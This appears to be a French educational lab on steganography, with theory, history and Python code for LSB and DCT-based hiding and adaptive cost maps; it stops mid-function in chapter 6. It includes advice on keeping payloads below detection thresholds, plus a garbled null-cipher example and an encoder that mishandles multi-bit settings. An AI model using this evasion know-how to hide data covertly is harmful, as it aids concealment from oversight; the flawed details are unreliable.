# TP Stéganographie
## L'Art de Cacher l'Information — De la Philosophie à l'Expertise
### Niveau Zéro → Expert · 2025-2026

---

> **Références officielles utilisées**
> - Johnson & Jajodia (1998) — *Exploring Steganography: Seeing the Unseen* — IEEE
> - Fridrich, J. (2009) — *Steganography in Digital Media* — Cambridge UP
> - Pevný, Filler, Bas (2010) — *Using High-Dimensional Image Models to Perform
>   Highly Undetectable Steganography* — ACM
> - JPEG Committee (2022) — ISO/IEC 10918-1 (JPEG Standard)
> - PNG Specification 1.2 — W3C Recommendation
> - Holub, Fridrich (2012) — *Designing Steganographic Distortion Using Directional Filters*
> - OpenStego Project — https://openstego.com
> - StegExpose (2014) — Steganography Detector — GitHub/vmonaco
> - BOSS (Break Our Steganographic System) Dataset — http://agents.fel.cvut.cz/boss/
>
> **Environnement** : Python 3.11+, Pillow, NumPy, OpenCV, Wireshark
> **Durée estimée** : 10 à 14 heures
> **Convention** : `$` = terminal · `→` = sortie · `💭` = réflexion · `🔬` = exercice · `⚠️` = piège

---

## TABLE DES MATIÈRES

```
PARTIE I — PHILOSOPHIE ET FONDEMENTS
  Chapitre 1 : Qu'est-ce que la stéganographie ?
  Chapitre 2 : Histoire et art du secret
  Chapitre 3 : Modèles théoriques formels

PARTIE II — STÉGANOGRAPHIE DANS LES IMAGES
  Chapitre 4 : LSB — La technique fondamentale
  Chapitre 5 : Stéganographie dans JPEG
  Chapitre 6 : Techniques avancées — F5, WOW, HUGO

PARTIE III — STÉGANOGRAPHIE RÉSEAU
  Chapitre 7 : Canaux cachés dans TCP/IP
  Chapitre 8 : DNS et HTTP covert channels
  Chapitre 9 : Timing channels

PARTIE IV — STÉGANALYSE (DÉTECTION)
  Chapitre 10 : Détection visuelle et statistique
  Chapitre 11 : Outils de stéganalyse
  Chapitre 12 : Attaques sur LSB et JPEG

PARTIE V — STÉGANOGRAPHIE AVANCÉE
  Chapitre 13 : Adaptive steganography
  Chapitre 14 : Stéganographie et cryptographie combinées
  Chapitre 15 : Applications réelles et forensique

PARTIE VI — ATELIERS ET CHALLENGES
  Chapitre 16 : Implémentation complète Python
  Chapitre 17 : CTF Steganography
  Chapitre 18 : Challenge final
```

---

# ════════════════════════════════════════════════════════
# PARTIE I — PHILOSOPHIE ET FONDEMENTS
# ════════════════════════════════════════════════════════

---

## Chapitre 1 : Qu'est-ce que la Stéganographie ?

### 1.1 La définition profonde

Le mot vient du grec : **στεγανός** (steganos = couvert, caché) + **γράφειν** (graphein = écrire). Littéralement : *écriture cachée*.

La stéganographie n'est **pas** la cryptographie. La distinction est philosophiquement fondamentale :

```
┌──────────────────────────────────────────────────────────────────┐
│  CRYPTOGRAPHIE          vs          STÉGANOGRAPHIE               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  "Je vous envoie un    │    "Je ne vous envoie rien              │
│   message, mais vous   │     de spécial. Ce n'est               │
│   ne pouvez pas le     │     qu'une photo de mon chat."          │
│   lire."               │                                         │
│                        │    (le message est dedans)              │
│  OBJECTIF :            │    OBJECTIF :                           │
│  Rendre le message     │    Cacher l'EXISTENCE MÊME              │
│  illisible             │    du message                           │
│                        │                                         │
│  L'adversaire SAIT     │    L'adversaire NE SAIT PAS             │
│  qu'un message existe  │    qu'un message est transmis           │
└──────────────────────────────────────────────────────────────────┘

COMBINAISON IDÉALE (2026) :
  Message → Chiffrement (cryptographie) → Dissimulation (stéganographie)
  → Double protection : même si le canal caché est détecté,
    le contenu reste chiffré.
```

### 1.2 Le triangle de la sécurité stéganographique

Un système stéganographique doit équilibrer trois propriétés antagonistes :

```
                    CAPACITÉ
                    (payload)
                       △
                       │
                       │
          ┌────────────┴────────────┐
          │      Zone optimale      │
          │   (impossible d'avoir   │
          │    tout à la fois)      │
          └────────┬───────┬────────┘
                   │       │
      IMPERCEPTIBILITÉ   ROBUSTESSE
      (invisibilité)    (résistance aux
                         transformations)

EXEMPLES :
  LSB simple    : haute capacité, haute imperceptibilité, faible robustesse
  Watermarking  : faible capacité, haute imperceptibilité, haute robustesse
  Spread spectrum: capacité moyenne, imperceptibilité haute, robustesse haute
```

### 1.3 Terminologie officielle

```
ACTEURS :
  Alice    → émetteur (encode le message secret)
  Bob      → récepteur (décode le message)
  Wendy    → gardien (peut inspecter les communications)
  Eve      → stéganalyste (tente de détecter/décoder)

ÉLÉMENTS :
  Carrier / Cover object  → l'objet innocent porteur (image, audio, texte)
  Payload / Secret message → le message à dissimuler
  Stego object            → le carrier APRÈS dissimulation
  Stego key               → clé qui paramètre la dissimulation
  Channel                 → le medium de transmission

ATTAQUES (modèle de Simmons, 1983) :
  Passive attack   → Eve détecte seulement (stéganalyse)
  Active attack    → Eve modifie les stego objects (sabotage)
  Malicious attack → Eve injecte ses propres messages
```

### 1.4 Capacité d'un canal stéganographique

```
CAPACITÉ THÉORIQUE (Shannon) :
  C = max I(X;Y)  où X = stego object, Y = message caché
  
  En pratique, pour LSB sur image 8-bit :
  Capacité brute : 1 bit par pixel
  Pour une image 1920×1080 (2 Mpx) :
  Capacité max = 2,073,600 bits = ~256 KB
  
  Mais la capacité UTILISABLE (sans détection) est bien plus faible.
  
  Règle empirique pour rester sous le radar :
  Ne pas dépasser 10-15% de la capacité maximale théorique
  → ~25 KB pour une image de 2 Mpx
```

💭 **Réflexion** : Si la stéganographie cache l'existence du message, est-elle plus sûre que la cryptographie ? Dans quels contextes chacune est-elle préférable ? Peut-on imaginer des situations où la cryptographie EST interdite légalement, rendant la stéganographie essentielle ?

---

## Chapitre 2 : Histoire et Art du Secret

### 2.1 Chronologie des techniques historiques

```
ANTIQUITÉ :
  ~440 AV J-C  Hérodote : tatouage sur crâne rasé du messager
               (attendre que les cheveux repoussent, puis raser)
  ~500 AV J-C  Écriture sous la cire des tablettes de bois
  Chine ancienne : message caché dans du riz ou de la soie
  Période romaine : encres sympathiques (jus de citron, lait...)

RENAISSANCE :
  1499  Trithème — Steganographia (premier traité de stéganographie)
  1553  Porta — acrostiche et premières techniques systématiques
  1605  Francis Bacon — chiffre bilitéral (A vs B en typographie)
        chaque lettre du texte apparent encode 1 bit du message secret

SECONDE GUERRE MONDIALE :
  Microdots (Allemagne) : réduire une page A4 à un point typographique
  Encres invisibles     : messages dans du courrier ordinaire
  Null ciphers          : premiers mots de phrases encodent le message
    Ex: "Fishing freshwater bends and saltwater coasts rewards anyone
         feeling stressed. Rewrite our code. Help ever. Hinder never."
    → Premières lettres de chaque mot : F B A S C R A F S R O C H E H N
    → "FASCIST REACH" ou autre message selon la méthode

ÈRE NUMÉRIQUE :
  1992  Steganography of the first kind (Simmons, formalisation)
  1996  Première conférence internationale (IHW — Information Hiding)
  1998  OutGuess — premier outil public robuste (Provos)
  2001  Rumeur post-9/11 : Al-Qaïda utiliserait la stéganographie
        (aucune preuve concrète n'a jamais été établie)
  2010  Illegitimate use : malwares utilisant stéganographie (Duqu, Flame)
  2015  Résurgence dans APT (Advanced Persistent Threats)
  2022+ IA générative + stéganographie = nouveaux défis
```

### 2.2 La guerre des nations — watermarking vs piracy

```
Un usage LÉGITIME et massif de la stéganographie :
le tatouage numérique (digital watermarking).

DIFFÉRENCE STÉGANOGRAPHIE vs WATERMARKING :
  Stéganographie : cacher un MESSAGE dans un objet
  Watermarking   : marquer un OBJET pour prouver sa propriété

Applications réelles du watermarking (2026) :
  ✦ Traçabilité des fuites de documents classifiés
    (chaque copie a un watermark différent par destinataire)
  ✦ DRM : DVD, streaming Netflix, Adobe
  ✦ Billets de banque : EURion constellation (empêche les photocopieurs)
  ✦ Empreinte forensique des photos de presse (AFP, Reuters)
  ✦ IA : les images générées par des IA (Stable Diffusion, DALL-E)
    intègrent parfois un watermark invisible pour la traçabilité
```

---

## Chapitre 3 : Modèles Théoriques Formels

### 3.1 Le modèle du prisonnier (Simmons, 1983)

```
CONTEXTE :
  Alice et Bob sont en prison.
  Wendy (gardien) lit TOUS leurs messages.
  Ils doivent comploter sans éveiller les soupçons.

MODÈLE FORMEL :
  Soient :
    C → espace des cover objects (images, textes...)
    M → espace des messages secrets
    K → espace des clés stéganographiques
    E : C × M × K → C  (fonction d'encodage)
    D : C × K → M       (fonction de décodage)

  Propriétés requises :
    1. Correction : D(E(c, m, k), k) = m  ∀ c, m, k
    2. Indétectabilité : dist(C, E(C, M, K)) ≈ 0
       (la distribution des stego objects ≈ cover objects)
    3. Sécurité : sans k, Eve ne peut pas extraire m

TYPES DE SÉCURITÉ :
  Sécurité parfaite (Cachin, 1998) :
    Probabilité pour Eve de distinguer cover de stego = 0
    Mesurée par la divergence KL : D_KL(P_C || P_S) = 0

  Sécurité computationnelle :
    Eve ne peut pas distinguer avec avantage significatif
    en temps polynomial.
```

### 3.2 Capacité du canal caché

```
THÉORIE DE L'INFORMATION APPLIQUÉE :
  Capacité stéganographique = I(Payload ; Stego object)

  Cas LSB sur image gaussienne :
  Si le bruit naturel de l'image est σ² et qu'on injecte
  un payload de variance ε², alors :
  
  Capacité ≈ n × (1/2) × log₂(1 + ε²/σ²)  bits
  
  Si ε² << σ² (modification très faible par rapport au bruit) :
  → Le message est noyé dans le bruit naturel → difficile à détecter.
  → Principe des méthodes modernes (WOW, HUGO, HILL).

TAUX D'EMBEDDING :
  α = (payload en bits) / (nombre de pixels × bits/pixel)
  
  Recommandations pratiques :
  α < 0.05 bpp → difficilement détectable
  α = 0.10 bpp → détectable par certains outils
  α > 0.20 bpp → facilement détectable
  bpp = bits per pixel
```

---

# ════════════════════════════════════════════════════════
# PARTIE II — STÉGANOGRAPHIE DANS LES IMAGES
# ════════════════════════════════════════════════════════

---

## Chapitre 4 : LSB — La Technique Fondamentale

### 4.1 Comprendre les LSBs

```
Un pixel d'image en niveaux de gris = 1 byte = 8 bits

Pixel = 11010110 (valeur = 214)
         ↑      ↑
         │      └── LSB (bit de poids faible) — modifiable sans impact visuel
         └── MSB (bit de poids fort) — modification = changement visible de couleur

Modifier le LSB :
  214 = 11010110  → 213 = 11010101  (différence de 1 sur 255)
  L'œil humain ne perçoit pas une différence de 1/255 de luminosité.

LSB Steganography :
  On encode le message secret bit par bit dans les LSBs des pixels.
  
  Exemple : cacher 'A' = 01000001 dans 8 pixels
  
  Pixel original   Bit message  Pixel modifié
  11010110 (214)      0        11010110 (214)  ← LSB déjà 0
  11011011 (219)      1        11011011 (219)  ← LSB déjà 1
  10101010 (170)      0        10101010 (170)  ← LSB déjà 0
  11001101 (205)      0        11001100 (204)  ← LSB 1→0 (-1)
  10110101 (181)      0        10110100 (180)  ← LSB 1→0 (-1)
  11100011 (227)      0        11100010 (226)  ← LSB 1→0 (-1)
  11011101 (221)      0        11011100 (220)  ← LSB 1→0 (-1)
  10101011 (171)      1        10101011 (171)  ← LSB déjà 1
  
  Modification maximale : ±1 par pixel  →  imperceptible
```

### 4.2 Implémentation LSB complète

```python
#!/usr/bin/env python3
"""
lsb_steganography.py — Stéganographie LSB complète
pip install Pillow numpy
"""

import os
import struct
from pathlib import Path
from PIL import Image
import numpy as np


class LSBSteganography:
    """
    Stéganographie LSB sur images PNG (sans perte).
    
    IMPORTANT : Ne jamais utiliser JPEG pour LSB !
    La compression JPEG détruit les LSBs (algorithme lossy).
    Formats supportés : PNG, BMP, TIFF (lossless uniquement).
    """

    # Marqueur de fin de message (sentinel)
    EOF_MARKER = b'\x00\x00\x00\x00\xDE\xAD\xBE\xEF'

    def __init__(self, bits_per_channel: int = 1):
        """
        bits_per_channel : nombre de LSBs utilisés par canal (1-4)
        1 = imperceptible, 4 = légèrement visible, 8 = image détruite
        """
        if bits_per_channel not in range(1, 5):
            raise ValueError("bits_per_channel doit être entre 1 et 4")
        self.bpc = bits_per_channel
        self._mask = (1 << bits_per_channel) - 1  # ex: 1 bpc → mask = 0b00000001

    def capacity(self, image: Image.Image) -> int:
        """Capacité en bytes pour cette image avec ce paramètre."""
        w, h = image.size
        channels = len(image.getbands())  # RGB=3, RGBA=4, L=1
        total_bits = w * h * channels * self.bpc
        return (total_bits - len(self.EOF_MARKER) * 8) // 8

    def _message_to_bits(self, message: bytes) -> list:
        """Convertit bytes → liste de bits (0 ou 1)."""
        bits = []
        for byte in message:
            for i in range(7, -1, -1):  # MSB first
                bits.append((byte >> i) & 1)
        return bits

    def _bits_to_bytes(self, bits: list) -> bytes:
        """Convertit liste de bits → bytes."""
        result = []
        for i in range(0, len(bits) - 7, 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)

    def encode(self, cover_path: str, message: bytes,
               output_path: str, password: str = None) -> dict:
        """
        Encode un message dans une image (LSB steganography).
        
        Si password fourni : mélange pseudo-aléatoire des pixels
        (améliore la résistance aux détecteurs statistiques basiques).
        """
        cover = Image.open(cover_path).convert('RGB')
        pixels = np.array(cover, dtype=np.uint8)

        # Préparer le message avec en-tête de longueur + marqueur fin
        full_message = struct.pack('>I', len(message)) + message + self.EOF_MARKER

        if len(full_message) > self.capacity(cover):
            raise ValueError(
                f"Message trop grand ({len(full_message)} bytes) "
                f"pour cette image (capacité: {self.capacity(cover)} bytes)"
            )

        bits = self._message_to_bits(full_message)

        # Ordre d'embedding des pixels
        total_pixels = pixels.shape[0] * pixels.shape[1] * 3
        indices = list(range(total_pixels))

        if password:
            import hashlib
            import random
            seed = int.from_bytes(
                hashlib.sha256(password.encode()).digest()[:8], 'big'
            )
            rng = random.Random(seed)
            rng.shuffle(indices)

        # Encoder les bits dans les LSBs
        flat_pixels = pixels.flatten()
        for i, bit in enumerate(bits):
            pixel_idx = indices[i]
            # Effacer les bpc LSBs et mettre le bit
            flat_pixels[pixel_idx] = (
                (flat_pixels[pixel_idx] & ~self._mask) | bit
            )

        # Reconstruire et sauvegarder
        stego_pixels = flat_pixels.reshape(pixels.shape)
        stego_img = Image.fromarray(stego_pixels, 'RGB')
        stego_img.save(output_path, 'PNG')

        # Statistiques
        stats = {
            "cover_image": cover_path,
            "output_image": output_path,
            "message_size": len(message),
            "image_size": f"{cover.width}×{cover.height}",
            "capacity_bytes": self.capacity(cover),
            "usage_percent": round(len(full_message) / self.capacity(cover) * 100, 2),
            "bpc": self.bpc,
            "password_protected": password is not None,
        }
        return stats

    def decode(self, stego_path: str, password: str = None) -> bytes:
        """Extrait le message d'une image stéganographiée."""
        stego = Image.open(stego_path).convert('RGB')
        pixels = np.array(stego, dtype=np.uint8)
        flat_pixels = pixels.flatten()

        # Même ordre d'extraction que l'encodage
        indices = list(range(len(flat_pixels)))
        if password:
            import hashlib
            import random
            seed = int.from_bytes(
                hashlib.sha256(password.encode()).digest()[:8], 'big'
            )
            rng = random.Random(seed)
            rng.shuffle(indices)

        # Extraire les bits
        bits = []
        for idx in indices:
            for b in range(self.bpc - 1, -1, -1):
                bits.append((flat_pixels[idx] >> b) & 1)

        # Convertir en bytes et chercher la longueur
        raw = self._bits_to_bytes(bits)
        if len(raw) < 4:
            raise ValueError("Image ne contient pas de message valide")

        message_len = struct.unpack('>I', raw[:4])[0]
        if message_len > len(raw) - 4:
            raise ValueError("Message corrompu ou mauvais mot de passe")

        return raw[4:4 + message_len]


# ═══════════════════════════════════════════
# DÉMONSTRATION
# ═══════════════════════════════════════════

def demo_lsb():
    """Démonstration complète LSB."""
    import requests
    from io import BytesIO

    # Créer une image de test (dégradé simple)
    print("Création d'une image de test...")
    img = Image.new('RGB', (512, 512))
    pixels = img.load()
    for x in range(512):
        for y in range(512):
            pixels[x, y] = (x % 256, y % 256, (x + y) % 256)
    img.save('/tmp/cover.png', 'PNG')

    steg = LSBSteganography(bits_per_channel=1)

    message = b"Message secret cache dans l'image. La steganographie est l'art de l'invisible."
    password = "motdepasse2026"

    print(f"\n{'='*50}")
    print(f"  DEMO LSB STEGANOGRAPHIE")
    print(f"{'='*50}")
    print(f"Message : {message.decode()}")
    print(f"Taille  : {len(message)} bytes")

    # Encodage
    stats = steg.encode('/tmp/cover.png', message, '/tmp/stego.png', password)
    print(f"\n[ENCODAGE]")
    print(f"  Image     : {stats['image_size']} px")
    print(f"  Capacité  : {stats['capacity_bytes']} bytes")
    print(f"  Utilisation: {stats['usage_percent']}%")

    # Décodage
    recovered = steg.decode('/tmp/stego.png', password)
    print(f"\n[DECODAGE]")
    print(f"  Récupéré  : {recovered.decode()}")
    print(f"  Intact    : {'✅' if recovered == message else '❌'}")

    # Comparer visuellement les images
    cover_arr = np.array(Image.open('/tmp/cover.png'))
    stego_arr = np.array(Image.open('/tmp/stego.png'))
    diff = np.abs(cover_arr.astype(int) - stego_arr.astype(int))
    print(f"\n[ANALYSE]")
    print(f"  Diff max      : {diff.max()} (sur 255)")
    print(f"  Diff moyenne  : {diff.mean():.4f}")
    print(f"  Pixels modif. : {(diff > 0).sum()} / {diff.size}")
    print(f"  PSNR          : {10 * np.log10(255**2 / ((diff**2).mean() + 1e-10)):.1f} dB")
    # PSNR > 50 dB = différence imperceptible


demo_lsb()
```

### 4.3 Analyse PSNR et imperceptibilité

```python
#!/usr/bin/env python3
# psnr_analysis.py — Analyser la qualité stéganographique

import numpy as np
from PIL import Image


def psnr(original: np.ndarray, modified: np.ndarray) -> float:
    """
    PSNR (Peak Signal-to-Noise Ratio) — mesure la qualité.
    
    PSNR = 10 × log₁₀(MAX² / MSE)
    
    Interprétation :
    > 50 dB → imperceptible
    40-50 dB → légèrement perceptible par expert
    30-40 dB → dégradation légère visible
    < 30 dB  → dégradation visible clairement
    """
    mse = np.mean((original.astype(float) - modified.astype(float)) ** 2)
    if mse == 0:
        return float('inf')
    return 10 * np.log10(255.0 ** 2 / mse)


def ssim(original: np.ndarray, modified: np.ndarray) -> float:
    """
    SSIM (Structural Similarity Index) — mesure perceptuelle.
    
    Valeur entre -1 et 1 :
    1.0 = identique
    > 0.999 = imperceptible
    > 0.95  = bonne qualité
    < 0.90  = dégradation visible
    """
    c1, c2 = (0.01 * 255)**2, (0.03 * 255)**2
    mu1, mu2 = original.mean(), modified.mean()
    s1, s2 = original.std(), modified.std()
    cov = np.mean((original - mu1) * (modified - mu2))
    return ((2*mu1*mu2 + c1) * (2*cov + c2)) / \
           ((mu1**2 + mu2**2 + c1) * (s1**2 + s2**2 + c2))


def analyze_payload_impact(cover_path: str):
    """
    Analyse l'impact de différents taux d'embedding sur la qualité.
    """
    cover = np.array(Image.open(cover_path).convert('RGB'), dtype=np.uint8)
    total_pixels = cover.size  # w × h × 3

    print(f"{'Taux':>8} {'Bits':>8} {'PSNR':>8} {'SSIM':>8} {'Détectable':>12}")
    print("-" * 55)

    for n_bits in [1, 2, 3, 4]:
        # Simuler l'embedding de n_bits LSBs aléatoires
        stego = cover.copy()
        mask = (1 << n_bits) - 1
        stego = (stego & ~mask) | np.random.randint(0, mask + 1, stego.shape, dtype=np.uint8)

        p = psnr(cover, stego)
        s = ssim(cover.astype(float), stego.astype(float))
        rate = n_bits / 8 * 100

        detection = "Difficile" if p > 50 else "Possible" if p > 40 else "Facile"
        print(f"{rate:>7.1f}% {n_bits:>8}   {p:>6.1f}dB  {s:>6.4f}  {detection:>12}")
```

### 4.4 LSB avec permutation pseudoaléatoire

```python
#!/usr/bin/env python3
"""
lsb_advanced.py — LSB amélioré avec distribution aléatoire
La distribution aléatoire rend l'analyse statistique plus difficile.
"""

import hashlib
import random
from PIL import Image
import numpy as np


def generate_pixel_sequence(width: int, height: int, channels: int,
                             password: str) -> list:
    """
    Génère une séquence pseudo-aléatoire de positions pixels.
    Basé sur SHA-256 du mot de passe comme graine.
    
    La même séquence peut être régénérée pour le décodage.
    """
    total = width * height * channels
    seed = int.from_bytes(hashlib.sha256(password.encode()).digest(), 'big')
    rng = random.Random(seed)
    sequence = list(range(total))
    rng.shuffle(sequence)
    return sequence


def lsb_scatter_encode(cover: np.ndarray, message: bytes,
                        password: str) -> np.ndarray:
    """
    LSB avec dispersion pseudo-aléatoire des bits.
    
    Sans dispersion (naïf) :
    → Les pixels modifiés sont consécutifs → pattern détectable
    → Analyse de la corrélation LSB entre pixels voisins → détection facile
    
    Avec dispersion :
    → Les pixels modifiés sont distribués aléatoirement dans l'image
    → Chaque bit du message = pixel aléatoire → aucun pattern spatial
    → Plus difficile à détecter statistiquement
    """
    h, w, c = cover.shape
    flat = cover.flatten()
    sequence = generate_pixel_sequence(w, h, c, password)

    # Préparer le payload : longueur (4 bytes) + message
    import struct
    payload = struct.pack('>I', len(message)) + message
    bits = []
    for byte in payload:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)

    if len(bits) > len(sequence):
        raise ValueError("Message trop grand pour cette image")

    stego = flat.copy()
    for i, bit in enumerate(bits):
        idx = sequence[i]
        stego[idx] = (stego[idx] & 0xFE) | bit

    return stego.reshape(cover.shape)


def lsb_scatter_decode(stego: np.ndarray, password: str) -> bytes:
    """Décode un message LSB dispersé."""
    import struct

    h, w, c = stego.shape
    flat = stego.flatten()
    sequence = generate_pixel_sequence(w, h, c, password)

    # Lire d'abord la longueur (32 bits = 32 pixels)
    length_bits = [flat[sequence[i]] & 1 for i in range(32)]
    msg_len = 0
    for bit in length_bits:
        msg_len = (msg_len << 1) | bit

    if msg_len > len(sequence) // 8 - 4:
        raise ValueError("Message corrompu ou mauvais mot de passe")

    # Lire le message complet
    total_bits = (4 + msg_len) * 8
    all_bits = [flat[sequence[i]] & 1 for i in range(total_bits)]

    result = []
    for i in range(4, 4 + msg_len):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | all_bits[i * 8 + j]
        result.append(byte)

    return bytes(result)
```

### 🔬 Exercice 4.1 — Visualiser les modifications LSB

```python
#!/usr/bin/env python3
# exercice_visualize_lsb.py

from PIL import Image, ImageEnhance
import numpy as np


def extract_lsb_plane(image_path: str, channel: int = 0,
                      bit_position: int = 0) -> Image.Image:
    """
    Extrait un plan de bits d'une image.
    Utile pour la stéganalyse visuelle.
    
    channel : 0=Rouge, 1=Vert, 2=Bleu
    bit_position : 0=LSB, 7=MSB
    """
    img = np.array(Image.open(image_path).convert('RGB'))
    channel_data = img[:, :, channel]
    bit_plane = ((channel_data >> bit_position) & 1) * 255
    return Image.fromarray(bit_plane.astype(np.uint8), 'L')


def compare_lsb_planes(cover_path: str, stego_path: str):
    """
    Compare les plans LSB du cover et du stego.
    Si LSB modifié de façon non naturelle → pattern visible.
    
    Une image naturelle : plan LSB ≈ bruit aléatoire (pas de structure)
    Une image stéganographiée : plan LSB peut avoir des régions uniformes
    ou des patterns révélateurs.
    """
    for channel_name, c in [('Rouge', 0), ('Vert', 1), ('Bleu', 2)]:
        cover_lsb = extract_lsb_plane(cover_path, c, 0)
        stego_lsb = extract_lsb_plane(stego_path, c, 0)

        cover_arr = np.array(cover_lsb)
        stego_arr = np.array(stego_lsb)

        changed = (cover_arr != stego_arr).sum()
        total = cover_arr.size
        print(f"Canal {channel_name}: {changed}/{total} LSBs modifiés ({changed/total*100:.2f}%)")

        # Sauvegarder les plans pour inspection visuelle
        cover_lsb.save(f'/tmp/lsb_cover_{channel_name.lower()}.png')
        stego_lsb.save(f'/tmp/lsb_stego_{channel_name.lower()}.png')

    print("\n→ Ouvrir les fichiers dans /tmp/ et comparer visuellement")
    print("→ Si le stego a des zones uniformes dans le plan LSB : message détecté !")


# Utilisation avec vos fichiers cover.png et stego.png
# compare_lsb_planes('/tmp/cover.png', '/tmp/stego.png')

# QUESTIONS :
# 1. Pourquoi le plan LSB d'une image naturelle ressemble-t-il à du bruit ?
# 2. Que verrait-on dans le plan LSB si on encodait un texte ASCII sans dispersion ?
# 3. Comment la dispersion pseudo-aléatoire change-t-elle l'apparence du plan LSB ?
```

---

## Chapitre 5 : Stéganographie dans JPEG

### 5.1 Comprendre la compression JPEG

```
JPEG = compression avec PERTE (lossy).
Le processus détruit les LSBs lors de la compression.

PIPELINE JPEG :
  Image RGB
    ↓ Conversion YCbCr (luminance + chrominance)
    ↓ Sous-échantillonnage chrominance (4:2:0)
    ↓ Découpage en blocs 8×8 pixels
    ↓ DCT (Discrete Cosine Transform) par bloc
    ↓ Quantification (ici la perte de qualité)
    ↓ Codage Huffman (sans perte)
    → Fichier JPEG

APRÈS DÉCOMPRESSION :
  Huffman inverse → DCT inverse → image approximative
  Les LSBs originaux sont perdus → LSB steganography DÉTRUITE.

SOLUTION : Encoder dans les COEFFICIENTS DCT
  Après la quantification, les coefficients DCT entiers
  sont les valeurs qui persistent.
  → Modifier les LSBs des coefficients DCT quantifiés
    = modification invisible ET survivant au (re)encodage JPEG.

OUTILS HISTORIQUES :
  F3 (Franz, 2001) : modifie LSBs des coefficients DCT
  F4 (Franz, 2001) : évite les zéros (compression inefficace)
  F5 (Westfeld, 2001) : matrice embedding, meilleure efficacité
  OutGuess (Provos, 2001) : préserve la distribution globale des coeff.
```

### 5.2 Manipuler les coefficients DCT

```python
#!/usr/bin/env python3
"""
jpeg_steganography.py — Stéganographie dans JPEG via coefficients DCT
pip install jpegio (ou utiliser python-jpegdct)
"""

import numpy as np
from scipy.fftpack import dct, idct


def dct_2d(block: np.ndarray) -> np.ndarray:
    """DCT 2D d'un bloc 8×8."""
    return dct(dct(block, axis=0, norm='ortho'), axis=1, norm='ortho')


def idct_2d(block: np.ndarray) -> np.ndarray:
    """DCT inverse 2D."""
    return idct(idct(block, axis=1, norm='ortho'), axis=0, norm='ortho')


def quantization_table_luminance() -> np.ndarray:
    """Table de quantification JPEG standard (qualité 50)."""
    return np.array([
        [16, 11, 10, 16, 24, 40, 51, 61],
        [12, 12, 14, 19, 26, 58, 60, 55],
        [14, 13, 16, 24, 40, 57, 69, 56],
        [14, 17, 22, 29, 51, 87, 80, 62],
        [18, 22, 37, 56, 68,109,103, 77],
        [24, 35, 55, 64, 81,104,113, 92],
        [49, 64, 78, 87,103,121,120,101],
        [72, 92, 95, 98,112,100,103, 99],
    ], dtype=float)


def analyze_dct_block(block: np.ndarray):
    """
    Démonstration de la DCT sur un bloc 8×8.
    Montre comment l'énergie se concentre sur les basses fréquences.
    """
    Q = quantization_table_luminance()

    # DCT
    dct_block = dct_2d(block.astype(float) - 128)

    # Quantification (étape de perte JPEG)
    quantized = np.round(dct_block / Q).astype(int)

    # Coefficient DC (coin haut-gauche) = composante basse fréquence
    # Coefficients AC = hautes fréquences (souvent 0 après quantification)
    non_zero = np.count_nonzero(quantized)
    total = quantized.size

    print(f"Coefficients DCT non-nuls : {non_zero}/{total} ({non_zero/total*100:.1f}%)")
    print(f"Coefficient DC (luminosité moyenne) : {quantized[0,0]}")
    print(f"Coefficients AC (détails) :")
    print(quantized)

    # En stéganographie JPEG : on modifie les LSBs des coeff. AC non-nuls
    # Eviter le coeff. DC (trop visible si modifié)
    ac_coeffs = quantized.flatten()[1:]  # tout sauf DC
    nonzero_ac = ac_coeffs[ac_coeffs != 0]
    print(f"\nCoefficients AC non-nuls (candidats à l'embedding) : {len(nonzero_ac)}")


# Exemple avec un bloc réaliste
test_block = np.array([
    [52, 55, 61, 66, 70, 61, 64, 73],
    [63, 59, 66, 90, 109, 85, 69, 72],
    [62, 59, 68, 113, 144, 104, 66, 73],
    [63, 58, 71, 122, 154, 106, 70, 69],
    [67, 61, 68, 104, 126, 88, 68, 70],
    [79, 65, 60, 70, 77, 68, 58, 75],
    [85, 71, 64, 59, 55, 61, 65, 83],
    [87, 79, 69, 68, 65, 76, 78, 94]
])

analyze_dct_block(test_block)
```

---

## Chapitre 6 : Techniques Avancées

### 6.1 WOW — Wavelet Obtained Weights

```
WOW (Holub & Fridrich, 2012) est une technique "adaptative" :
au lieu d'encoder partout dans l'image,
elle encode UNIQUEMENT dans les zones texturées / complexes.

PHILOSOPHIE :
  L'œil humain (et les détecteurs statistiques) ont plus de mal
  à détecter des modifications dans les zones bruyantes/texturées
  que dans les zones lisses/uniformes.

  Zone lisse (ciel uni) → modification LSB = très visible / détectable
  Zone texturée (herbe, cheveux) → modification LSB = noyée dans le bruit

ALGORITHME :
  1. Calculer une carte de coûts ρ(i,j) pour chaque pixel :
     - Faible ρ dans les zones texturées → embedding bon marché
     - Élevé ρ dans les zones lisses → embedding coûteux
  
  2. Minimiser la distorsion D = Σ ρ(i,j) × |modification(i,j)|
     sous contrainte que le payload est embarqué.
  
  3. Utiliser STCs (Syndrome Trellis Codes) pour encoder
     efficacement sous contrainte de distorsion.

Résultat : même taux de payload, détectabilité 10-100× plus faible
que LSB naïf.
```

```python
#!/usr/bin/env python3
# wow_cost_map.py — Calculer la carte de coûts WOW

import numpy as np
from PIL import Image


def compute_wow_cost_map(image: np.ndarray) -> np.ndarray:
    """
    Approximation simplifiée du calcul de coûts WOW.
    
    Utilise des filtres de gradient pour mesurer la complexité locale.
    Vrai WOW utilise des filtres en ondelettes directionnelles.
    """
    if image.ndim == 3:
        img = image.mean(axis=2)  # Convertir en niveaux de gris
    else:
        img = image.astype(float)

    # Filtres de gradient (approximation des filtres WOW)
    from scipy.ndimage import convolve

    # Filtre horizontal
    h1 = np.array([[-1, 2, -1]])
    # Filtre vertical
    h2 = h1.T
    # Filtre diagonal
    h3 = np.array([[-1, 0, 1], [0, 0, 0], [1, 0, -1]]) / 4

    r1 = convolve(img, h1, mode='reflect')
    r2 = convolve(img, h2, mode='reflect')
    r3 = convolve(img, h3, mode='reflect')

    # Coût = inverse de la complexité locale
    # Plus la texture est forte, plus le coût est faible
    epsilon = 1e-8  # éviter division par zéro
    complexity = np.abs(r1) + np.abs(r2) + np.abs(r3)
    cost = 1.0 / (complexity + epsilon)

    # Normaliser entre 0 et 1
    cost = (cost - cost.min()) / (cost.max() - cost.min() + epsilon)
    return cost


def demo_adaptive_embedding():
    """
    Montre visuellement où WOW place les données dans l'image.
    """
    # Créer une image de test avec zones lisses et texturées
    img = np.zeros((256, 256), dtype=np.float64)
    # Zone lisse (gauche)
    img[:, :128] = 128 + np.random.normal(0, 2, (256, 128))
